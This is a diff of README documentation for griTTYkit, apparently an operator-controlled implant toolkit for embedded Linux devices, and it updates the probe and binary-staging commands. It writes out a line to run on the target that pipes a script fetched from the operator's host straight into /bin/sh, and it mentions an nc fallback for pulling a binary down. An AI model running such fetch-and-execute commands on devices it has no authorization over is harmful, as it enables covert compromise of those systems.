@@ -41,23 +41,24 @@ The probe bootstrap (`probe.sh`) is a ~40-line POSIX sh script served
 on-demand by the operator console. It runs before griTTYkit exists on the
 device — all it needs is `wget` or `curl` and `/bin/sh`. It determines arch,
 kernel version, word size, and endianness, then POSTs the results back to the
-operator. From there, `listener probe config` generates a build config and
-`listener probe serve` stages the right binary for the detected architecture.
+operator. From there, `listener probe config` populates an active target
+profile, and `listener serve` stages the right binary for that profile.
 
 ```sh
 # operator side — one command
 grit[all]> listener probe start
   wget -O- http://192.168.1.10:22207/probe.sh | /bin/sh   # ← run this on target
 grit[all]> listener probe results      # see what came back
-grit[all]> listener probe config write-config configs/grit.conf
-grit[all]> listener probe serve start
+grit[all]> listener probe config       # populate the active profile
+grit[all]> listener serve start        # stage and serve a compatible binary
 ```
 
-`listener probe serve start` stages the selected binary, starts the file service
-when requested, and prints target-side fetch options. For first deployment use
-the shown `wget` or `curl` command; when the file service is configured without
-TLS, the console also prints a raw HTTP `nc` fallback. After griTTYkit is
-already present, use the shown `grit fetch ...` command.
+`listener serve start` stages the selected binary from the active profile,
+starts the file service when requested, and prints target-side fetch options.
+For first deployment use the shown `wget` or `curl` command; when the file
+service is configured without TLS, the console also prints a raw HTTP `nc`
+fallback. After griTTYkit is already present, use the shown `grit fetch ...`
+command.
 
 ### Finds somewhere to live, no matter what
 
@@ -363,24 +364,26 @@ Probe results  (1 received)
   1  192.168.8.1:...  mips    5.10.176  Linux  32    big     05-31 14:41
 
   Next steps:
-    listener probe config                           — generate config from most recent result
-    listener probe config write-config FILE         — generate and save
-    listener probe serve [start]                    — stage the matching binary for this arch
+    listener probe config                           — populate active profile from most recent result
+    listener probe config write-config FILE         — export build config
+    listener serve start                            — stage a matching binary from active profile
 ```
 
-Generate and save a config from probe data:
+Populate the active profile from probe data:
 
 ```
-grit[all]> listener probe config write-config configs/grit.conf
+grit[all]> listener probe config
 ```
 
-This writes a build/artifact config. It is separate from the operator console
-server config such as `local/server-config.json`.
+This writes target/deployment context to `local/operator-session/profiles.json`.
+It is separate from the operator console server config such as
+`local/server-config.json`. To export a build/artifact config instead, use
+`listener probe config write-config FILE`.
 
 Stage the right binary for the detected architecture:
 
 ```
-grit[all]> listener probe serve start
+grit[all]> listener serve start
 
 Release artifact staged:
   target_fetch_command=grit fetch grit-mipsel-linux-4.x-musl-default-full ...
